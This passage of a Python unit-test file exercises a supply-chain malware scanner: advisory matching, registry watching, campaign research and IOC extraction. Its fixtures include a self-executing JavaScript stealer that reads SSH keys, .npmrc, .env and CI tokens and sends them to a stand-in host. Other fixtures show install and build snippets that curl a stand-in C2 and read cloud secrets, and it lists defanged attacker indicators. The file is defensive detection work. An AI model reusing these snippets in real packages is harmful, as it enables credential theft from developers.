            with mock.patch.object(supply_chain, "ADVISORIES_DIR", advisory_dir):
                first = supply_chain.check_advisory("npm", "cached-pkg", "1.0.0")
                advisory_path.write_text(json.dumps({
                    "advisory_id": "ADV-CACHE",
                    "title": "Cached advisory",
                    "status": "active",
                    "affected": [{"ecosystem": "npm", "package": "cached-pkg", "versions": ["2.0.0"]}],
                }), encoding="utf-8")
                second = supply_chain.check_advisory("npm", "cached-pkg", "2.0.0")
                stale = supply_chain.check_advisory("npm", "cached-pkg", "1.0.0")

        self.assertTrue(first["matched"])
        self.assertTrue(second["matched"])
        self.assertFalse(stale["matched"])

    def test_removed_artifact_with_advisory_creates_malicious_finding(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            advisory_dir = temp_path / "advisories"
            findings_dir = temp_path / "findings"
            advisory_dir.mkdir()
            (advisory_dir / "test.json").write_text(json.dumps({
                "advisory_id": "ADV-REMOVED",
                "title": "Removed artifact advisory",
                "status": "active",
                "affected": [{"ecosystem": "npm", "package": "@scope/removed", "versions": ["9.9.9"]}],
                "detection_rationale": ["Registry artifact was removed after compromise."],
            }), encoding="utf-8")
            old_findings_dir = os.environ.get("SECOPS_FINDINGS_DIR")
            os.environ["SECOPS_FINDINGS_DIR"] = str(findings_dir)
            try:
                with mock.patch.object(supply_chain, "ADVISORIES_DIR", advisory_dir), \
                     mock.patch.object(supply_chain, "RESULTS_PATH", temp_path / "results.jsonl"), \
                     mock.patch.object(supply_chain, "_npm_get_previous_version", return_value="9.9.8"), \
                     mock.patch.object(supply_chain, "_diff_package", return_value=(None, None)):
                    payload = supply_chain.run_scan(
                        ecosystem="npm",
                        package="@scope/removed",
                        version="9.9.9",
                        previous_version=None,
                    )
            finally:
                if old_findings_dir is None:
                    os.environ.pop("SECOPS_FINDINGS_DIR", None)
                else:
                    os.environ["SECOPS_FINDINGS_DIR"] = old_findings_dir

        result = payload["result"]
        self.assertEqual(result["verdict"], "malicious")
        self.assertIn("advisory_matches", result)
        self.assertIn("advisory matched", result["error"])
        self.assertTrue(payload["db_path"].endswith("openclaw_soc.db"))

    def test_explain_verdict_includes_advisory_evidence(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            advisory_dir = Path(temp_dir) / "advisories"
            advisory_dir.mkdir()
            (advisory_dir / "test.json").write_text(json.dumps({
                "advisory_id": "ADV-EXPLAIN",
                "title": "Explain advisory",
                "status": "active",
                "affected": [{"ecosystem": "pypi", "package": "guardrails-ai", "versions": ["0.10.1"]}],
                "iocs": {"file_paths": ["/tmp/transformers.pyz"]},
                "remediation": ["Remove version 0.10.1 and rotate exposed credentials."],
            }), encoding="utf-8")
            with mock.patch.object(supply_chain, "ADVISORIES_DIR", advisory_dir):
                payload = supply_chain.explain_verdict(
                    "",
                    ecosystem="pypi",
                    package="guardrails-ai",
                    version="0.10.1",
                )

        self.assertEqual(payload["verdict"], "malicious")
        self.assertEqual(payload["advisory_matches"][0]["advisory_id"], "ADV-EXPLAIN")
        self.assertIn("emergency advisory match", [rule["rule"] for rule in payload["matched_rules"]])

    def test_node_ipc_seed_advisory_matches_affected_versions_only(self):
        for version in ("9.1.6", "9.2.3", "12.0.1"):
            payload = supply_chain.check_advisory("npm", "node-ipc", version)
            self.assertTrue(payload["matched"], version)
            self.assertEqual(payload["matches"][0]["campaign_id"], "node-ipc-stealer-backdoor-2026")

        clean = supply_chain.check_advisory("npm", "node-ipc", "12.0.0")
        self.assertFalse(clean["matched"])

    def test_javascript_semantic_findings_detect_node_ipc_style_payload(self):
        source = """
const os = require("os");
const fs = require("fs");
const https = require("https");
(() => {
  const host = os.hostname();
  const home = os.homedir();
  const env = process.env.GITHUB_TOKEN || process.env.NPM_TOKEN;
  const files = [home + "/.ssh/id_rsa", home + "/.npmrc", home + "/.env"].map((p) => fs.readFileSync(p, "utf8"));
  const body = Buffer.from(JSON.stringify({ host, env, files })).toString("base64");
  https.request("https://example.invalid/collect").end(body);
})();
"""
        findings = supply_chain._javascript_semantic_findings("node-ipc.cjs", source)
        joined = "\n".join(findings)
        self.assertIn("module-load execution", joined)
        self.assertIn("host fingerprinting", joined)
        self.assertIn("local file enumeration", joined)
        self.assertIn("credential harvesting", joined)
        self.assertIn("exfiltration staging", joined)
        self.assertIn("node-ipc CommonJS bundle", joined)

    def test_classifier_flags_node_ipc_style_semantic_findings(self):
        report = """
## Semantic Findings

- node-ipc.cjs: javascript module-load execution via IIFE/self-executing payload
- node-ipc.cjs: javascript host fingerprinting via os APIs
- node-ipc.cjs: javascript local file enumeration of developer or credential paths
- node-ipc.cjs: javascript environment credential harvesting via process.env
- node-ipc.cjs: javascript payload wrapping or exfiltration staging
- node-ipc.cjs: node-ipc CommonJS bundle contains high-risk appended payload indicators
"""
        payload = supply_chain.explain_verdict(report, ecosystem="npm", package="node-ipc", version="12.0.2")
        self.assertEqual(payload["verdict"], "malicious")
        rules = {rule["rule"] for rule in payload["matched_rules"]}
        self.assertIn("semantic module-load execution", rules)
        self.assertIn("semantic credential harvesting", rules)
        self.assertIn("node-ipc bundle payload indicators", rules)

    def test_watch_registry_dry_run_scans_mocked_recent_npm_version_without_persisting(self):
        now = 1_800_000_000.0
        metadata = {
            "time": {
                "created": "2026-05-01T00:00:00.000Z",
                "9.2.2": "2026-05-01T00:00:00.000Z",
                "9.2.3": datetime_from_epoch(now - 60),
                "modified": datetime_from_epoch(now - 30),
            }
        }
        fake_result = supply_chain.ScanResult(
            ecosystem="npm",
            package="node-ipc",
            old_version="9.2.2",
            new_version="9.2.3",
            verdict="malicious",
            analysis="advisory matched",
            report_path=None,
            rank=None,
            finding_id="SCM-NODEIPC",
        )
        with mock.patch.object(supply_chain, "_scan_release", return_value=fake_result) as scan_mock, \
             mock.patch.object(supply_chain, "_append_results") as append_mock, \
             mock.patch.object(supply_chain, "_upsert_findings") as upsert_mock:
            payload = supply_chain.watch_registry(
                ecosystem="npm",
                package="node-ipc",
                since="10m",
                dry_run=True,
                persist=False,
                metadata=metadata,
                now=now,
            )

        self.assertEqual(payload["total_scanned"], 1)
        self.assertEqual(payload["malicious"], 1)
        scan_mock.assert_called_once()
        self.assertEqual(scan_mock.call_args.kwargs["old_version"], "9.2.2")
        append_mock.assert_not_called()
        upsert_mock.assert_not_called()

    def test_watch_registry_package_scoped_new_ecosystem_uses_metadata_rows(self):
        now = 1_800_000_000.0
        metadata = {
            "versions": [
                {"num": "1.0.0", "created_at": datetime_from_epoch(now - 900)},
                {"num": "1.0.1", "created_at": datetime_from_epoch(now - 60)},
            ]
        }
        fake_result = supply_chain.ScanResult(
            ecosystem="crates",
            package="fixture",
            old_version="1.0.0",
            new_version="1.0.1",
            verdict="benign",
            analysis="reviewed",
            report_path=None,
            rank=None,
            finding_id=None,
        )
        with mock.patch.object(supply_chain, "_scan_release", return_value=fake_result) as scan_mock:
            payload = supply_chain.watch_registry(
                ecosystem="crates",
                package="fixture",
                since="10m",
                dry_run=True,
                persist=False,
                metadata=metadata,
                now=now,
            )
        self.assertEqual(payload["total_scanned"], 1)
        self.assertEqual(payload["recent_versions"][0]["version"], "1.0.1")
        self.assertEqual(scan_mock.call_args.kwargs["old_version"], "1.0.0")

    def test_node_ipc_mitigation_keeps_package_verdict_independent_of_local_usage(self):
        payload = supply_chain.explain_verdict("", ecosystem="npm", package="node-ipc", version="12.0.1")
        self.assertEqual(payload["verdict"], "malicious")
        self.assertEqual(payload["environment_impact"]["status"], "unknown")
        self.assertTrue(any("Block affected versions" in step for step in payload["mitigation"]))

    def test_deadcode_campaign_advisory_matches_reported_packages(self):
        for package in [
            "chalk-tempalte",
            "@deadcode09284814/axios-util",
            "axois-utils",
            "color-style-utils",
        ]:
            payload = supply_chain.check_advisory("npm", package, "0.0.1")
            self.assertTrue(payload["matched"], package)
            self.assertEqual(payload["matches"][0]["campaign_id"], "deadcode09284814-infostealer-botnet-campaign")

    def test_campaign_ioc_extraction_handles_defanged_indicators(self):
        payload = supply_chain.extract_campaign_iocs([
            "Credentials were sent to 87e0bbc636999b.lhr[.]life and 80.200.28[.]28:2222.",
            "Repository description: A Mini Sha1-Hulud has Appeared",
        ])
        self.assertIn("87e0bbc636999b.lhr.life", payload["domains"])
        self.assertIn("80.200.28.28:2222", payload["ip_ports"])
        self.assertIn("A Mini Sha1-Hulud has Appeared", payload["repository_descriptions"])

    def test_research_campaign_correlates_npm_fixture(self):
        fixture = REPO_ROOT / "tests" / "fixtures" / "deadcode09284814-campaign.json"
        campaign = json.loads(fixture.read_text(encoding="utf-8"))
        payload = supply_chain.research_campaign(campaign=campaign, dry_run=True, no_fetch=True)
        self.assertEqual(payload["campaign_id"], "deadcode09284814-infostealer-botnet-campaign")
        self.assertEqual(len(payload["packages"]), 4)
        self.assertIn(payload["campaign_verdict"], {"confirmed_true_positive", "likely_true_positive"})
        self.assertEqual(payload["environment_impact"]["status"], "not_observed")
        self.assertTrue(any(item["signal"] == "same_publisher" for item in payload["correlations"]))
        self.assertTrue(any("Shai-Hulud" in item for item in payload["behavioral_indicators"]))
        chalk = next(item for item in payload["packages"] if item["package"] == "chalk-tempalte")
        self.assertIn(chalk["package_verdict"], {"confirmed_true_positive", "likely_true_positive"})
        self.assertIn("87e0bbc636999b.lhr.life", chalk["iocs"]["domains"])

    def test_research_campaign_separates_local_impact_from_package_verdict(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            root = Path(temp_dir)
            (root / "package-lock.json").write_text(
                json.dumps({"packages": {"node_modules/chalk-tempalte": {"version": "0.0.1"}}}),
                encoding="utf-8",
            )
            campaign = json.loads((REPO_ROOT / "tests" / "fixtures" / "deadcode09284814-campaign.json").read_text(encoding="utf-8"))
            payload = supply_chain.research_campaign(campaign=campaign, search_root=str(root), dry_run=True, no_fetch=True)
        chalk = next(item for item in payload["packages"] if item["package"] == "chalk-tempalte")
        self.assertEqual(chalk["environment_impact"]["status"], "confirmed_affected")
        self.assertIn(chalk["package_verdict"], {"confirmed_true_positive", "likely_true_positive"})

    def test_research_campaign_can_persist_soc_findings_with_campaign_id(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            old_findings_dir = os.environ.get("SECOPS_FINDINGS_DIR")
            os.environ["SECOPS_FINDINGS_DIR"] = temp_dir
            try:
                campaign = json.loads((REPO_ROOT / "tests" / "fixtures" / "deadcode09284814-campaign.json").read_text(encoding="utf-8"))
                payload = supply_chain.research_campaign(campaign=campaign, dry_run=False, persist=True, no_fetch=True)
            finally:
                if old_findings_dir is None:
                    os.environ.pop("SECOPS_FINDINGS_DIR", None)
                else:
                    os.environ["SECOPS_FINDINGS_DIR"] = old_findings_dir
        self.assertTrue(payload["finding_ids"])
        self.assertTrue(payload["db_path"])

    def test_research_campaign_accepts_cross_ecosystem_packages(self):
        campaign = {
            "campaign_id": "unit-cross-ecosystem-campaign",
            "source_urls": ["https://example.com/report"],
            "iocs": {"domains": ["c2.example"]},
            "packages": [
                {
                    "ecosystem": "pypi",
                    "package": "evil_pkg",
                    "version": "1.0.0",
                    "files": {"setup.py": "import os, subprocess; subprocess.Popen(['curl','https://c2.example'])"},
                },
                {
                    "ecosystem": "crates",
                    "package": "evil-crate",
                    "version": "1.0.0",
                    "files": {"build.rs": "std::process::Command::new(\"curl\"); std::env::var(\"GITHUB_TOKEN\");"},
                },
                {
                    "ecosystem": "maven",
                    "package": "com.example:evil",
                    "version": "1.0.0",
                    "files": {"src/Main.java": "Runtime.getRuntime().exec(\"curl https://c2.example\"); System.getenv(\"AWS_SECRET_ACCESS_KEY\");"},
                },
            ],
        }
        payload = supply_chain.research_campaign(campaign=campaign, dry_run=True, no_fetch=True)
        self.assertEqual(set(payload["ecosystems"]), {"crates", "maven", "pypi"})
        self.assertEqual(len(payload["packages"]), 3)
        self.assertTrue(all(item["matched_rules"] for item in payload["packages"]))
        self.assertIn(payload["campaign_verdict"], {"likely_true_positive", "confirmed_true_positive"})

    def test_cli_research_campaign_outputs_json(self):
        fixture = REPO_ROOT / "tests" / "fixtures" / "deadcode09284814-campaign.json"
        stdout = StringIO()
        with mock.patch("sys.stdout", stdout):
            exit_code = secopsai_cli.main([
                "--json",
                "supply-chain",
                "research-campaign",
                "--input",
                str(fixture),
                "--dry-run",
            ])
        self.assertEqual(exit_code, 0)
        self.assertIn('"campaign_id": "deadcode09284814-infostealer-botnet-campaign"', stdout.getvalue())

    def test_reconcile_history_upgrades_advisory_error(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            advisory_dir = temp_path / "advisories"
            advisory_dir.mkdir()
            results_path = temp_path / "results.jsonl"
            findings_dir = temp_path / "findings"
            results_path.write_text(json.dumps({
                "ecosystem": "npm",
                "package": "@scope/removed",
                "old_version": "1.0.0",
                "new_version": "1.0.1",
                "verdict": "error",
                "analysis": "",
                "report_path": None,
                "rank": None,
                "finding_id": None,
                "error": "diff generation failed",
            }) + "\n", encoding="utf-8")
            (advisory_dir / "test.json").write_text(json.dumps({
                "advisory_id": "ADV-RECONCILE",
                "title": "Reconcile advisory",
                "status": "active",
                "affected": [{"ecosystem": "npm", "package": "@scope/removed", "versions": ["1.0.1"]}],
            }), encoding="utf-8")
            old_findings_dir = os.environ.get("SECOPS_FINDINGS_DIR")
            os.environ["SECOPS_FINDINGS_DIR"] = str(findings_dir)
            try:
                with mock.patch.object(supply_chain, "ADVISORIES_DIR", advisory_dir), \
                     mock.patch.object(supply_chain, "RESULTS_PATH", results_path):
                    payload = supply_chain.reconcile_history(include_advisories=True)
                    rows = [json.loads(line) for line in results_path.read_text(encoding="utf-8").splitlines()]
            finally:
                if old_findings_dir is None:
                    os.environ.pop("SECOPS_FINDINGS_DIR", None)
                else:
                    os.environ["SECOPS_FINDINGS_DIR"] = old_findings_dir

        self.assertEqual(payload["reclassified"], 1)
        self.assertEqual(rows[0]["verdict"], "malicious")
        self.assertIn("ADV-RECONCILE", rows[0]["advisory_matches"][0]["advisory_id"])

    def test_cli_explain_verdict_resolves_stored_report(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            report_path = Path(temp_dir) / "report.md"
            report_path.write_text("eval\n", encoding="utf-8")
            results = [{
                "ecosystem": "pypi",
                "package": "requests",
                "new_version": "2.32.0",
                "report_path": str(report_path),
            }]
            stdout = StringIO()
            with mock.patch.object(secopsai_cli, "load_recent_results", return_value=results), \
                 mock.patch("sys.stdout", stdout):
                exit_code = secopsai_cli.main([
                    "--json",
                    "supply-chain",
                    "explain-verdict",
                    "--ecosystem",
                    "pypi",
                    "--package",
                    "requests",
                    "--version",
                    "2.32.0",
                ])

        self.assertEqual(exit_code, 0)
        output = stdout.getvalue()
        self.assertIn('"verdict": "benign"', output)
        self.assertIn('"report_path":', output)
        self.assertIn('"matched_rules"', output)


if __name__ == "__main__":
    unittest.main()
